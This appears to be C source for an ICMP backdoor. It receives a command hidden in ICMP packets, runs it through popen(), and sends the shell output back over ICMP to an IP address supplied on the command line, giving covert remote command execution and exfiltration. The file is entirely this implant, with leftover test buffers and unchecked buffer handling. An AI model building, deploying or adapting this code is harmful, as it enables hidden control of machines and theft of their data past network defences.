#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include "icmp_send.h"
#include "icmp_recv.h"


void exec_cmd(const char *cmd, char *output) {
    FILE *cmd_file = popen(cmd, "r");
    char buff[20] = {0};
    while(fgets(buff, sizeof(buff), cmd_file))
        strcat(output, buff);
}


int main(int argc, char *argv[]) {
    char *target_ip;

    if (argc < 2) {
        printf("not found target ip");
        exit(-1);
    }
	// recv
	char recv_cipher_buff[1500] = {0};
    int recv_buff_size = 0;
    icmp_recv_socket_init();
    recv_icmp(recv_cipher_buff, &recv_buff_size);
    printf("recv done.\n");
    printf("total size: %d\n", recv_buff_size);
    fwrite(recv_cipher_buff, 1, recv_buff_size, stdout);

	char cmd_output[1500] = {0};
	exec_cmd(recv_cipher_buff, cmd_output);

	sleep(1);
	printf("begin to send icmp.\n");
	// send
    target_ip = argv[1];
	icmp_send_socket_init(target_ip);
	char *data = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccEEEE";
	// char plain_buff[] = {0x54, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x54, 0x65, 0x73, 0x74, 0x20, 0x46, 0x69, 0x6c, 0x65, 0x2e, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x00};
	char *plain_buff = "recved data and send new data";
	char cipher_buff[] = { 0xeb, 0x14, 0xa2, 0x37, 0xb0, 0x22, 0xb3, 0x12, 0xab, 0xda, 0x9b, 0xf8, 0x60, 0x32, 0x96, 0x9d, 0xda, 0xed, 0x21, 0x09, 0xc0, 0x1b, 0x00, 0x01};
	send_icmp(cmd_output, strlen(cmd_output));

    return 0;
}
